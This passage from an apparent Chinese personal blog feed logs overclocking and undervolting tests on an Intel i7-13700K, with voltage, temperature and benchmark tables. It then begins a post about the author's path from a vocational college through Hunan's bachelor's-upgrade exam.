FPU：温度95度浮动，P Core 最热 97°C，E Core 最热 87°C 。功耗235W，软显电压1.344V</p><p>P95 Small FFTs：温度103度浮动，P Core 最热 105°C，E Core 最热 93°C 。功耗270W，软显电压1.300V</p><hr><p>对于超频我有两种选择，一种是全核固定频率，一种是动态超频。在此我对两种结果都测试一下。此外还有一种是通过调整 VID 相关 + offset 实现对原有电压曲线进行调整，同时对不同的负载核数动态调整频率。现在网上比较主流的是后面那一种。</p><p>固定电压模式有一个缺点就是CPU电压不能下探到1V以下，导致待机功耗偏高，30W左右。</p><p>超频我所预想的结果是CPU不撞110°C温度墙，在此基础上尽可能达到单核更高频率并且稳定运行，不能出现不稳定情况。</p><h2 id="定压定频超频"><a href="#定压定频超频" class="headerlink" title="定压定频超频"></a>定压定频超频</h2><p>首先CPU定频1.3V，防掉压设置Mode3。5.6GHz开始起摸。</p><h3 id="5-6GHz"><a href="#5-6GHz" class="headerlink" title="5.6GHz"></a><del><strong>5.6GHz</strong></del></h3><table><thead><tr><th>电压</th><th>P95</th><th>CPU-Z</th><th>R23</th><th>FPU</th><th>remark</th></tr></thead><tbody><tr><td>1.30V</td><td>报错</td><td>916&#x2F;11093</td><td></td><td>94°C&#x2F;233W</td><td></td></tr><tr><td>1.35V</td><td>报错</td><td>918&#x2F;11093</td><td>26186</td><td></td><td></td></tr><tr><td>1.35V</td><td>撞墙</td><td>918&#x2F;11086</td><td></td><td></td><td>Mode2</td></tr><tr><td>1.30V</td><td>掉线程</td><td></td><td></td><td></td><td>Mode2</td></tr><tr><td>1.32V</td><td>掉线程</td><td></td><td></td><td></td><td>Mode2</td></tr><tr><td>1.33V</td><td>撞墙110°C&#x2F;282W&#x2F;490W&#x2F;1.324V</td><td>914&#x2F;11116</td><td>26137&#x2F;204W&#x2F;1.326V</td><td>93°C&#x2F;226W&#x2F;381W&#x2F;1.326V</td><td></td></tr><tr><td>1.34V</td><td>撞墙</td><td></td><td></td><td></td><td>Mode2</td></tr><tr><td>1.35V</td><td>撞墙</td><td></td><td></td><td></td><td>Mode2</td></tr></tbody></table><p><strong>放弃5.6GHz。</strong></p><h3 id="5-5GHz"><a href="#5-5GHz" class="headerlink" title="5.5GHz"></a><strong>5.5GHz</strong></h3><table><thead><tr><th>电压</th><th>P95</th><th>CPU-Z</th><th>R23</th><th>FPU</th><th>remark</th></tr></thead><tbody><tr><td>1.33V</td><td>108°C&#x2F;305W&#x2F;1.292V</td><td></td><td></td><td></td><td></td></tr><tr><td>1.32V</td><td>107°C&#x2F;285W&#x2F;1.286V</td><td></td><td></td><td></td><td></td></tr><tr><td><strong>1.31V</strong></td><td><strong>104°C&#x2F;277W&#x2F;507W&#x2F;1.276V</strong></td><td><strong>898&#x2F;10983</strong></td><td><strong>25928&#x2F;183W&#x2F;1.288V</strong></td><td>86°C&#x2F;208W&#x2F;350W&#x2F;1.284V</td><td></td></tr><tr><td>1.30V</td><td>闪退101°C&#x2F;250W&#x2F;1.268V</td><td>897&#x2F;10987</td><td>25830&#x2F;182W&#x2F;1.278V</td><td></td><td></td></tr><tr><td>1.29V</td><td>闪退+死机</td><td></td><td></td><td></td><td></td></tr><tr><td>1.28V</td><td>死机98°C&#x2F;240W&#x2F;1.248V</td><td></td><td></td><td></td><td></td></tr><tr><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td><strong>1.28V</strong></td><td><strong>103°C&#x2F;270W&#x2F;483W&#x2F;1.274V</strong></td><td><strong>897&#x2F;10979</strong></td><td><strong>25877&#x2F;182W&#x2F;1.276V</strong></td><td><strong>85°C&#x2F;202W&#x2F;345W&#x2F;1.276V</strong></td><td><strong>Mode2</strong></td></tr><tr><td>1.27V</td><td>9min闪退100°C&#x2F;265W&#x2F;462W&#x2F;1.266V</td><td>899&#x2F;10978</td><td>25919&#x2F;177W&#x2F;1.266V</td><td></td><td>Mode2</td></tr><tr><td>1.26V</td><td>10min闪退97°C&#x2F;260W&#x2F;457W&#x2F;1.256V</td><td></td><td></td><td></td><td>Mode2</td></tr><tr><td>1.25V</td><td>闪退</td><td></td><td></td><td></td><td>Mode2</td></tr></tbody></table><p>个人觉得Mode2获得的电压比较平一点，所以倾向于使用这个。</p><p>在此基础上拿出这两组数据，作为定频定压超频最终结果。我最终选的的是第二组数据使用，电压为了考虑稳定性必须要多给0.03V。</p><table><thead><tr><th>Vcore</th><th>LLC</th><th>P95</th><th>CPU-Z</th><th>R23</th><th>FPU</th><th>remark</th></tr></thead><tbody><tr><td>1.31V</td><td>Mode3</td><td>104°C&#x2F;277W&#x2F;507W&#x2F;1.276V</td><td>898&#x2F;10983</td><td>25928&#x2F;183W&#x2F;1.288V</td><td>86°C&#x2F;208W&#x2F;350W&#x2F;1.284V</td><td></td></tr><tr><td>1.28V</td><td>Mode2</td><td>103°C&#x2F;270W&#x2F;483W&#x2F;1.274V</td><td>897&#x2F;10979</td><td>25877&#x2F;182W&#x2F;1.276V</td><td>85°C&#x2F;202W&#x2F;345W&#x2F;1.276V</td><td></td></tr></tbody></table><h3 id="最终结果"><a href="#最终结果" class="headerlink" title="最终结果"></a>最终结果</h3><table><thead><tr><th>参数</th><th>P95</th><th>CPU-Z</th><th>R23</th><th>FPU</th><th>remark</th></tr></thead><tbody><tr><td><a href="mailto:&#x35;&#x2e;&#x35;&#71;&#104;&#122;&#64;&#49;&#x2e;&#x32;&#x39;&#86;">&#x35;&#x2e;&#x35;&#71;&#104;&#122;&#64;&#49;&#x2e;&#x32;&#x39;&#86;</a> LLC Mode 2</td><td>105°C&#x2F;270W&#x2F;492W&#x2F;1.282V</td><td>901&#x2F;10953</td><td>25927&#x2F;186W&#x2F;1.284V</td><td>89°C&#x2F;208W&#x2F;350W&#x2F;1.284V</td><td>玩原神会闪退&#x2F;TM5不过</td></tr><tr><td><strong><a href="mailto:&#53;&#x2e;&#53;&#71;&#104;&#122;&#64;&#x31;&#46;&#51;&#52;&#86;">&#53;&#x2e;&#53;&#71;&#104;&#122;&#64;&#x31;&#46;&#51;&#52;&#86;</a> LLC Mode 3</strong></td><td>掉线程降频&#x2F;300W&#x2F;518W&#x2F;1.300V</td><td></td><td></td><td></td><td></td></tr></tbody></table><p>讲真的，我是真的不想用这个电压，甚至想降压摸 AC LL 去了，这我都给了110°C的功耗墙，已经顶着墙跑了。</p><p>网友说一般跑R23测试，那我就跑吧。</p><p>依然是 Mode 3 防掉压，电压0.01V一档，找到稳定跑10min不报错的点，跑稳之后再试试（据说对13代）压力更大的R15。</p><p>结果因为我是 Win10 跑不了，作罢。</p><table><thead><tr><th>电压</th><th>R23</th><th>FPU</th><th>remark</th></tr></thead><tbody><tr><td>1.31V</td><td>25928&#x2F;183W&#x2F;1.288V</td><td>86°C&#x2F;208W&#x2F;350W&#x2F;1.284V</td><td></td></tr><tr><td>1.30V</td><td>25830&#x2F;182W&#x2F;1.278V</td><td></td><td></td></tr><tr><td>1.29V</td><td>185W&#x2F;312W1.266V</td><td></td><td></td></tr><tr><td>1.28V</td><td>第三圈报错</td><td></td><td></td></tr><tr><td>1.27V</td><td>自动关机</td><td></td><td></td></tr><tr><td>1.25V</td><td>报错</td><td></td><td></td></tr></tbody></table><p>然后想了想，折腾这么久就为了0.2GHz，而且还不稳定，所以作罢，尝试降压。</p><h2 id="降压"><a href="#降压" class="headerlink" title="降压"></a>降压</h2><p>按大佬所说的，先摸防掉压开多少合适，然后降低AC DC。这里依然列一个表，既然是降压那就得把P95加进来。</p><p>依然是P95跑稳了再跑R23，打开超线程。</p><p>R23 基准分数 30800</p><p>这里贴一个我自己测试的</p><h3 id="CPU-Lite-Load-Control-表"><a href="#CPU-Lite-Load-Control-表" class="headerlink" title="CPU Lite Load Control 表"></a><strong>CPU Lite Load Control 表</strong></h3><table><thead><tr><th>LLC</th><th>AC</th><th>DC</th></tr></thead><tbody><tr><td>1</td><td>1</td><td>1</td></tr><tr><td>2</td><td>10</td><td>80</td></tr><tr><td>3</td><td>15</td><td>80</td></tr><tr><td>4</td><td>20</td><td>80</td></tr><tr><td>5</td><td>25</td><td>80</td></tr><tr><td>6</td><td>30</td><td>80</td></tr><tr><td>7</td><td>35</td><td>80</td></tr><tr><td>8</td><td>40</td><td>80</td></tr><tr><td>9</td><td>50</td><td>80</td></tr><tr><td>10</td><td>60</td><td>80</td></tr><tr><td>11</td><td>70</td><td>80</td></tr><tr><td>12</td><td>80</td><td>80</td></tr><tr><td>13</td><td>90</td><td>90</td></tr><tr><td>14</td><td>100</td><td>100</td></tr><tr><td>15</td><td>110</td><td>110</td></tr><tr><td>…</td><td>…</td><td>…</td></tr></tbody></table><h3 id="调整-LLC-测试"><a href="#调整-LLC-测试" class="headerlink" title="调整 LLC 测试"></a><strong>调整 LLC 测试</strong></h3><table><thead><tr><th>VRM LLC</th><th>CPU LiteLoad</th><th>P95</th><th>R23</th><th>FPU</th><th>remark</th></tr></thead><tbody><tr><td>Auto</td><td>Auto(50 80)</td><td>掉线程109°C&#x2F;316W&#x2F;536W&#x2F;1.276V</td><td>97°C&#x2F;253W&#x2F;412W&#x2F;1.320V</td><td>100°C&#x2F;252W&#x2F;404W&#x2F;1.332V</td><td>内存调好基础上</td></tr><tr><td>Auto</td><td>Auto(50 80)</td><td>109°C&#x2F;280W&#x2F;425W&#x2F;1.316V</td><td>94°C&#x2F;248W&#x2F;394W&#x2F;1.310V</td><td>98°C&#x2F;247W&#x2F;392W&#x2F;1.330V</td><td>全默认只改温度墙</td></tr><tr><td>Auto</td><td>Auto(50 80)</td><td>降频109°C&#x2F;316W&#x2F;536W&#x2F;1.296V</td><td>94°C&#x2F;247W&#x2F;398W&#x2F;1.312V</td><td>96°C&#x2F;246W&#x2F;386W&#x2F;1.326V</td><td>以上基础开 BCLK 100Mhz Lock</td></tr><tr><td>Auto</td><td>Mode 1</td><td>闪退</td><td>报错</td><td>85°C&#x2F;210W&#x2F;318W&#x2F;1.194V</td><td></td></tr><tr><td>Mode 8</td><td>Mode 1</td><td>蓝屏</td><td>报错</td><td>85°C&#x2F;210W&#x2F;318W&#x2F;1.194V</td><td></td></tr><tr><td>Mode 7</td><td>Mode 1</td><td>闪退</td><td>87°C&#x2F;225W&#x2F;349W&#x2F;1.230V</td><td>90°C&#x2F;218W&#x2F;340W&#x2F;1.234V</td><td>30740</td></tr><tr><td><strong>Mode 6</strong></td><td><strong>Mode 1</strong></td><td><strong>闪退99°C&#x2F;306W&#x2F;466W&#x2F;1.216V</strong></td><td><strong>91°C&#x2F;229W&#x2F;365W&#x2F;1.252V</strong></td><td><strong>91°C&#x2F;223W&#x2F;348W&#x2F;1.254V</strong></td><td><strong>30804</strong></td></tr><tr><td>Mode 5</td><td>Mode 1</td><td>掉线程108°C&#x2F;305W&#x2F;494W&#x2F;1.248V</td><td>92°C&#x2F;237W&#x2F;382W&#x2F;1.272V</td><td>94°C&#x2F;228W&#x2F;368W&#x2F;1.274V</td><td>30684</td></tr><tr><td>Mode 4</td><td>Mode 1</td><td>不测了</td><td>°C&#x2F;W&#x2F;W&#x2F;V</td><td></td><td></td></tr><tr><td>…</td><td>…</td><td>…</td><td>…</td><td>…</td><td></td></tr></tbody></table><p>这里我感觉选 Mode 6 比较合适，先这样用几天看看。</p><h3 id="换了新电源，重新测试一下。"><a href="#换了新电源，重新测试一下。" class="headerlink" title="换了新电源，重新测试一下。"></a><strong>换了新电源，重新测试一下。</strong></h3><p>原来老电源3.3V和5V的DCDC有问题，导致内存不稳定，买了一个新的AR650+捍卫版，目前用着还挺不错的。</p><table><thead><tr><th>VRM LLC</th><th>CPU LiteLoad</th><th>P95</th><th>R23</th><th>FPU</th><th>remark</th></tr></thead><tbody><tr><td>Auto</td><td>Auto(50 80)</td><td>降频104°C&#x2F;290W&#x2F;551W&#x2F;1.254V</td><td>91°C&#x2F;243W&#x2F;418W&#x2F;1.310V</td><td>95°C&#x2F;245W&#x2F;409W&#x2F;1.324V</td><td></td></tr><tr><td>Mode 6</td><td>Mode 1</td><td>闪退98°C&#x2F;295W&#x2F;491W&#x2F;1.218V</td><td>83°C&#x2F;220W&#x2F;364W&#x2F;1.236V</td><td>85°C&#x2F;214W&#x2F;355W&#x2F;1.238V</td><td></td></tr><tr><td><strong>Mode 6</strong></td><td><strong>Mode 1</strong></td><td><strong>92°C&#x2F;267W&#x2F;424W&#x2F;1.226V</strong></td><td><strong>73°C&#x2F;179W&#x2F;308W&#x2F;1.252V</strong></td><td><strong>82°C&#x2F;198W&#x2F;335W&#x2F;1.246V</strong></td><td><strong>以下关HT</strong></td></tr><tr><td>Mode 7</td><td>Mode 1</td><td>90°C&#x2F;255W&#x2F;413W&#x2F;1.202V</td><td>72°C&#x2F;174W&#x2F;300W&#x2F;1.236V</td><td>81°C&#x2F;192W&#x2F;331W&#x2F;1.226V</td><td>25266分</td></tr><tr><td>Auto(Mode 8)</td><td>Mode 1</td><td>84°C&#x2F;188W&#x2F;316W&#x2F;1.194V</td><td>69°C&#x2F;168W&#x2F;284W&#x2F;1.202V</td><td>76°C&#x2F;186W&#x2F;300W&#x2F;1.192V</td><td>25272分</td></tr></tbody></table><p>对于在这里我选择还是关闭 HT，如果保留 HT 的话可以锁一个253W的功耗墙，这样也可以。</p><h2 id="动态超频"><a href="#动态超频" class="headerlink" title="动态超频"></a>动态超频</h2><p>首先根据泥潭大佬的步骤</p><h3 id="第一步：摸出稳定的默频电压曲线"><a href="#第一步：摸出稳定的默频电压曲线" class="headerlink" title="第一步：摸出稳定的默频电压曲线"></a>第一步：摸出稳定的默频电压曲线</h3><p>也就是降压。像超频，一般会把设置调整到稳定性临界，在倍频电压曲线的默频部分，我也希望降压到稳定性临界。</p><blockquote><p>限制电压对象为“实际VID电压”，建议设置为1450，即1.45v。防止哪个地方抽风或输入误操作给了超高电压把CPU炸了。</p><p>ACLL之前已设置为0.01，CPU没有ACLL掉压补偿，默认的VRM LL 1.10毫欧(LLC 等级3)掉压严重，大电流时会稳定性不足，所以之后还需要找一个合适的VRM LL&#x2F;LLC。<br>DCLL也设置为0.01，这是为了方便观察“裸VID电压”，从而方便对VID曲线进行调整。副作用是“实际VID电压”未被DCLL降压，所以软件功耗会虚高。上面设置的253瓦功耗墙大概等价于正常设置的230瓦功耗墙。</p></blockquote><h4 id="调整-VRM-LoadLine"><a href="#调整-VRM-LoadLine" class="headerlink" title="调整 VRM LoadLine"></a><strong>调整 VRM LoadLine</strong></h4><p>这里我设置的 VRM LLC Mode 6，也就是0.56mOhm。</p><hr><p>这是我这块板子的 LLC 对照表</p><blockquote><p>LLC1 0.01<br>LLC2 忘了<br>LLC3 0.12<br>LLC4 0.28<br>LLC5 0.4<br>LLC6 0.56<br>LLC7 0.69<br>LLC8 0.96</p></blockquote><hr><p><strong>对于 LLC 电压补偿和 CPU LiteLoad 还有 AVX2 Voltage Guardband 我有点不太清楚，所以这里做一个测试看看。</strong></p><p>在 VRM LoadLine Mode 6 下调整 CPU LiteLoad Mode。</p><table><thead><tr><th>LiteLoad</th><th>Vcore</th><th>温度</th><th>软显功耗</th><th>整机功耗</th></tr></thead><tbody><tr><td>mode1</td><td>1.222</td><td>96</td><td>299</td><td>443</td></tr><tr><td>mode1+关avx升压</td><td>1.222</td><td>93</td><td>299</td><td>435</td></tr><tr><td>mode2</td><td>1.248</td><td>100</td><td>273</td><td>466</td></tr><tr><td>mode2+关avx升压</td><td>1.248</td><td>100</td><td>272</td><td>453</td></tr><tr><td>mode3</td><td>1.264</td><td>103</td><td>282</td><td>470</td></tr><tr><td>mode3+关avx升压</td><td>1.264</td><td>101</td><td>281</td><td>475</td></tr><tr><td><strong>AC DC 1+关avx升压</strong></td><td><strong>1.222</strong></td><td><strong>97</strong></td><td><strong>295</strong></td><td><strong>448</strong></td></tr></tbody></table><p>实测 AVX2 Voltage Guardband 大概是没用的，就算有用也作用很小。</p><table><thead><tr><th>VRM LoadLine</th><th>P95</th><th>CPU-Z</th><th>R23</th><th>FPU</th></tr></thead><tbody><tr><td>Auto</td><td>闪退</td><td>865&#x2F;12667&#x2F;1.22V</td><td>30895&#x2F;215&#x2F;308&#x2F;1.194V</td><td>75°C&#x2F;208W&#x2F;299W&#x2F;1.198V</td></tr><tr><td><strong>Mode 6</strong></td><td><strong>94&#x2F;298&#x2F;434&#x2F;1.222V</strong></td><td><strong>863&#x2F;12664&#x2F;1.272V</strong></td><td><strong>30783&#x2F;228W&#x2F;341W&#x2F;1.252V</strong></td><td><strong>84°C&#x2F;222W&#x2F;331W&#x2F;1.256V</strong></td></tr><tr><td>Mode 7</td><td>闪退</td><td></td><td></td><td>81°C&#x2F;222W&#x2F;331W&#x2F;1.236V</td></tr><tr><td>Mode 8</td><td>闪退</td><td>866&#x2F;12686&#x2F;1.222V</td><td>30800&#x2F;212W&#x2F;310W&#x2F;1.192V</td><td>77°C&#x2F;207W&#x2F;303W&#x2F;1.198V</td></tr></tbody></table><p>可以得出结论是 CPU Lite Load Mode 调整的是 AC DC LoadLine 的值，而 LLC Mode 则调整的是 VRM LoadLine 的值，而 AVX2 Voltage Guardband 好像没什么作用，其三者功能都是对 CPU 做电压补偿，所以楼主所说的仅用 LLC 做电压补偿是可行的。</p><h4 id="调整-Voltage-Offset"><a href="#调整-Voltage-Offset" class="headerlink" title="调整 Voltage Offset"></a><strong>调整 Voltage Offset</strong></h4><p>在此基础上我对 CPU 电压进行 Offset 调整，目前我 CPU 的参数是：AC DC 1, LLC Mode 6, AVX Voltage Guardband Scale 0, PL1&#x3D;PL2&#x3D;253W。</p><p>然后根据楼主的方法跑R23测试临界值，不跑 P95 AVX 的原因是因为负载太大，其实际使用中根本碰不到这种场合，所以意义不大</p><table><thead><tr><th>VRM LLC</th><th>Offset</th><th>P95</th><th>R23</th><th>FPU</th><th>result</th></tr></thead><tbody><tr><td>6</td><td>-0.05</td><td>闪退</td><td>85°C&#x2F;226W&#x2F;351W&#x2F;1.252V</td><td></td><td></td></tr><tr><td>6</td><td>-0.10</td><td></td><td>79°C&#x2F;206W&#x2F;323W&#x2F;1.208V</td><td>80&#x2F;201W&#x2F;316W&#x2F;1.212V</td><td></td></tr><tr><td>6</td><td>-0.11</td><td></td><td>78°C&#x2F;203W&#x2F;316W&#x2F;1.198V</td><td>79&#x2F;197W&#x2F;306W&#x2F;1.202V</td><td></td></tr><tr><td>6</td><td>-0.12</td><td></td><td>掉线程76°C&#x2F;220W&#x2F;311W&#x2F;1.190V</td><td></td><td></td></tr><tr><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>Auto</td><td>-0.05</td><td></td><td>76°C&#x2F;212W&#x2F;314W&#x2F;1.196V</td><td></td><td></td></tr><tr><td>Auto</td><td>-0.06</td><td></td><td>掉线程75°C&#x2F;210W&#x2F;310W&#x2F;1.186V</td><td></td><td></td></tr><tr><td>Auto</td><td>-0.07</td><td></td><td>掉线程</td><td></td><td></td></tr><tr><td>Auto</td><td>-0.10</td><td></td><td>掉线程</td><td></td><td></td></tr></tbody></table><h4 id="摸-CPU-跑-R23-的最低电压"><a href="#摸-CPU-跑-R23-的最低电压" class="headerlink" title="摸 CPU 跑 R23 的最低电压"></a><strong>摸 CPU 跑 R23 的最低电压</strong></h4><table><thead><tr><th>Freq</th><th>Offset</th><th>R23</th><th>remark</th></tr></thead><tbody><tr><td>5.3GHz</td><td>-0.19V</td><td>1.152V</td><td></td></tr><tr><td>5.4GHz</td><td>-0.185V</td><td>1.192V</td><td></td></tr><tr><td>5.5GHz</td><td>-0.14V</td><td>1.236V</td><td></td></tr><tr><td>5.6GHz</td><td>-0.09V</td><td>1.286V&#x2F;188W</td><td></td></tr><tr><td>5.7GHz</td><td>+0.01V</td><td>1.366V&#x2F;229W</td><td></td></tr><tr><td><del>5.8GHz</del></td><td><del>+0.12V</del></td><td><del>1.494V&#x2F;299W</del></td><td>设置少了不稳，设置多了撞墙</td></tr><tr><td></td><td></td><td></td><td></td></tr></tbody></table><h4 id="摸单核体质"><a href="#摸单核体质" class="headerlink" title="摸单核体质"></a><strong>摸单核体质</strong></h4><h4 id="摸-VID-表"><a href="#摸-VID-表" class="headerlink" title="摸 VID 表"></a><strong>摸 VID 表</strong></h4><p>在摸大核体质的时候因为小核最低也有 1.0xV 的电压，所以需要手动进BIOS把小核关闭。</p><p>得到VID表如下</p><img src="/my_pc/image-20230618173129493.png" class="" title="image-20230618173129493"><h3 id="第二步：放弃"><a href="#第二步：放弃" class="headerlink" title="第二步：放弃"></a>第二步：放弃</h3><p>其实在降压过程中在调整LLC后，对于我这颗CPU的体质已经到上限了，再调整频率的话收益不大，所以就这样用了，在极限烤机下能到温度墙的边缘，自己已经挺满意这样的情况了。</p><p>所以CPU下最终结果是，关闭 HT+VRM LLC Mode <del>8</del> 7 + CPU LiteLoad Mode 1。</p><p>对性能0提升，仅仅对极限环境下的稳定性有提升<del>（伪）</del>。</p><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p><a href="https://ngabbs.com/read.php?tid=34192551&rand=980">https://ngabbs.com/read.php?tid=34192551&amp;rand=980</a></p><p><a href="https://skatterbencher.com/2022/11/24/skatterbencher-50-intel-core-i7-13700k-overclocked-to-6000mhz/">https://skatterbencher.com/2022/11/24/skatterbencher-50-intel-core-i7-13700k-overclocked-to-6000mhz/</a></p><p><a href="https://elmorlabs.com/2019-09-05/vrm-load-line-visualized/">https://elmorlabs.com/2019-09-05/vrm-load-line-visualized/</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;配置如下&quot;&gt;&lt;a href=&quot;#配置如下&quot; class=&quot;headerlink&quot; title=&quot;配置如下&quot;&gt;&lt;/a&gt;配置如下&lt;/h1&gt;&lt;ul&gt;
&lt;li&gt;CPU: Intel Core i7-13700K&lt;ul&gt;
&lt;li&gt;Base Clock &lt;ul&gt;
&lt;li&gt;P </summary>
      
    
    
    
    <category term="硬件" scheme="https://blog.irec.moe/categories/%E7%A1%AC%E4%BB%B6/"/>
    
    
    <category term="PC" scheme="https://blog.irec.moe/tags/PC/"/>
    
  </entry>
  
  <entry>
    <title>3年大专&amp;专升本上岸记录</title>
    <link href="https://blog.irec.moe/escape_ydxy.html"/>
    <id>https://blog.irec.moe/escape_ydxy.html</id>
    <published>2022-07-30T12:30:00.000Z</published>
    <updated>2023-08-19T04:16:49.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="个人背景"><a href="#个人背景" class="headerlink" title="个人背景"></a>个人背景</h1><p>我高三厌学，因为家里有表哥的先例，和家人商议后选择了单招。前期院校就随便凭自己的兴趣选的湖南邮电职业技术学院。</p><p>在19年那年单招考试成绩出了后，我被原高中准许离校，便赴约去了深圳一趟（4月），见到了好多好多大佬。</p><img src="/escape_ydxy/image-20220730174943391.png" class="" title="image-20220730174943391"><img src="/escape_ydxy/2019-04-24-210501.mov_000034.473.jpg" class="" title="2019-04-24-210501.mov_000034.473"><p>一窗台手机的大佬</p><p>单招考试的时候报名了校内的青春10000号，之后回校（湖南邮电职业学院）参加，就相当于打暑假工了。工作虽然不辛苦，但是很锻炼情绪，自己的坏习惯暴脾气给上班上没了，具体原因嘛，你猜。</p><p>上班到9月我就提桶跑步了，暑假工的钱，给父上大人换了一个K20Pro。</p><img src="/escape_ydxy/image-20220730175353165.png" class="" title="image-20220730175251915"><p>之后就是大学生活的日常了，军训，开学第一课……</p><p>一切都很正常，是我想要的大学样子，自己也对现状很满意（伪）。</p><p>其实直到大三我才意识到这完全不是我想象中大学的样子，在大一上课我要么就是在玩斗地主要么就是在睡觉，室友开始逃课，我也开始逃课，不过晚上还是要上班。生活是真的充实，每天睡的很香。</p><p>要不被环境影响是很难的，自己也很难意识到，大专总体环境就不说了吧，就是网上说的大专现状那样子。但虽然是大专但也有好的老师，给予我很多启发以及帮助，比如王香英老师，熊雅豪老师、张倩老师……</p><img src="/escape_ydxy/image-20220730173946880.png" class="" title="image-20220730173946880"><p>突如起来的疫情，让很多人都乱了手脚，我却很开心，到家不愁吃不愁穿，每天还能打游戏。开学的也是一个“假”开学。上课同学基本上不听，然后我也接着不听了，后来呢老师也摆烂。</p><p>疫情期间让我印象最深的是王老师不拘泥于网课形式，仍然对同学尽心尽力，连我也“被迫”参与其中，因为考核形式实在是不能摆，23333。</p><p>因为王老师的教学形式，我对英语的兴趣始终没有减退，从大二开始就一直记单词到现在，英语三、四级考试也成功顺利通过了，准备在本科冲一冲六级。</p><img src="/escape_ydxy/image-20220730174051555.png" class="" title="image-20220730174051555"><p>大二是我觉醒的时期，因为在大一下的疫情期间，被人作为大专生瞧不起。这也是一个契机，凭啥就凭学历歧视人，我也没隐瞒我是大专生，就因为学历这样说别人，带专人人上人？我看未必。</p><p>大三上的后半个学期和暑假实习去了，这着实让我感觉到了生活的艰辛，并以此为契机开始努力学习了。后面就是专升本的事情了。</p><blockquote><p>这种充实的生活引起我的警觉了，因为白天几乎没有闲着，晚上洗澡的时候思考人生。究竟适不适合干这种事（智能家居安装），觉得工作价值意义不太符合自己的观念。但是自己一直在以“提前体验生活、体验社会”为理由，让自己坚持。自己本身目的之一是拿到实习证明，第二是去得到社会经验。</p><p>from：<a href="https://ancient-pasta-c48.notion.site/2021-f233c5e6f5c3415595ef90778fb67f3a">https://ancient-pasta-c48.notion.site/2021-f233c5e6f5c3415595ef90778fb67f3a</a></p></blockquote><img src="/escape_ydxy/image-20220730200333024.png" class="" title="image-20220730200333024"><h1 id="考试前期准备"><a href="#考试前期准备" class="headerlink" title="考试前期准备"></a>考试前期准备</h1><p>在校首先是知道了有个自考专升本，也报名了，再后面才知道有统招的专升本，有点后悔，三年的钱也有1w了，但是也算自己成功路上的铺垫吧。</p><h2 id="专业选择"><a href="#专业选择" class="headerlink" title="专业选择"></a>专业选择</h2><p>在湖南省的话，这一块只要关注一个文档。</p><blockquote><p>《湖南省2022年普通高校专升本考试对应专业（类）指导目录》</p><p>from：<a href="https://jyt.hunan.gov.cn/jyt/sjyt/hnsjyksy/web/ksyzcfg/202204/t20220418_22739135.html">https://jyt.hunan.gov.cn/jyt/sjyt/hnsjyksy/web/ksyzcfg/202204/t20220418_22739135.html</a></p></blockquote><p>湖南的政策是不允许跨考，也就是只能报考你专业相关的，这点同学们需要注意。</p><p>比如我的是移动通信技术专业，所属专科专业大类是通信，然后可以报考本科的电子信息类和计算机类。</p><img src="/escape_ydxy/image-20220730203020596.png" class="" title="image-20220730203020596"><p>有一个培训机构专门做了一个网站，可以在上面查询可以报的<strong>专业和学校</strong>，就不用自己一个一个翻查了。</p><p>link：<a href="http://www.cnupp.com/chaxun/">http://www.cnupp.com/chaxun/</a></p><img src="/escape_ydxy/image-20220730203143177.png" class="" title="image-20220730203143177"><p>2022年专升本考试有所延期，在3月9日的时候发了推迟通知。我得以多了半个月学习时间，这至关重要！</p><blockquote><p>1.填报志愿时间由3月10日-15日延迟到3月22日-27日；</p><p>2.免试生录取完成时间由4月15日延迟至4月25日；</p><p>3.考试时间由4月20日-30日延迟到5月6日-16日；</p><p>4.录取时间由5月15日左右延迟到6月10日左右。</p><p>from：<a href="https://jyt.hunan.gov.cn/jyt/sjyt/hnsjyksy/web/ksygggs/202203/t20220309_22739656.html">https://jyt.hunan.gov.cn/jyt/sjyt/hnsjyksy/web/ksygggs/202203/t20220309_22739656.html</a></p></blockquote><p>反正需要时时刻刻关注招考动态，在学校官网和湖南省教育厅都会有通知的</p><h2 id="择校"><a href="#择校" class="headerlink" title="择校"></a>择校</h2><p>其实也没有什么好选的，建议根据自己的学习情况，针对性的择校。如果自己觉得能力强的话，可以冲一冲，如果不太好还是保守点好。</p><p>对于现在这个大环境下，有一个本科学历还是要比专科好的（先不论个人能力），自己一定要慎重选择，只有一次机会。</p><p>我个人只是嫌弃民办学校学费太贵，不想给家里太大压力。大家一定要量力而行！参考上面的图我报的学校以及专业录取率只有13.33%。</p><img src="/escape_ydxy/image-20220730203921478.png" class="" title="image-20220730203921478"><p>from：<a href="https://www.bilibili.com/video/BV1VP4y1W7WE">https://www.bilibili.com/video/BV1VP4y1W7WE</a></p><h2 id="关于考试以及备考"><a href="#关于考试以及备考" class="headerlink" title="关于考试以及备考"></a>关于考试以及备考</h2><p>在考试的前期学校官网会有考纲出来，关注<strong>学校官网以及教务处</strong>这两个地方！然后就可以看到你所要考的科目，以及考试范围（这个依学校来定）</p><img src="/escape_ydxy/image-20220518211502020.png" class="" title="image-20220518211502020"><p>由于是已经考完了才写的，所以在后文是以考试角度分析的，也对你们更有参考性一点。对于以此学校为目标备考的同学更有参考性一点。不过我个人建议还是要熟络全书，选拔性考试，还是要做好万全的准备的。</p><h1 id="时间线"><a href="#时间线" class="headerlink" title="时间线"></a>时间线</h1><h2 id="2021年7月-10月"><a href="#2021年7月-10月" class="headerlink" title="2021年7月-10月"></a>2021年7月-10月</h2><p>7月13日，和家里人商量专升本事宜，表示支持。</p><p>7月15日报名缴费楚晟教育培训班，学费6***。</p><p>7-10月实习，学习时间极少</p><img src="/escape_ydxy/image-20220730205712290.png" class="" title="image-20220730205712290"><p>这是唯一在相册里找到的图片。</p><h2 id="2021年10月-12月"><a href="#2021年10月-12月" class="headerlink" title="2021年10月-12月"></a>2021年10月-12月</h2><p>参加学校毕业设计培训。</p><p>参加自考专升本考试。</p><p>开始跟班学习，刚开始备考是准备通信工程专业的，对我来说通信原理和高数是两大天坑，然后查资料才知道是可以选其他专业的，培训班的老师还持怀疑态度，劝退我。</p><img src="/escape_ydxy/IMG_0980.jpg" class="" title="IMG_0980"><img src="/escape_ydxy/IMG_1099.jpg" class="" title="IMG_1099"><p>11月，开始备考四级和自考英语考试，脱离宿舍生活。</p><img src="/escape_ydxy/IMG_5736.jpg" class="" title="IMG_5736"><p>图书馆周末不开门</p><img src="/escape_ydxy/IMG_6014.jpg" class="" 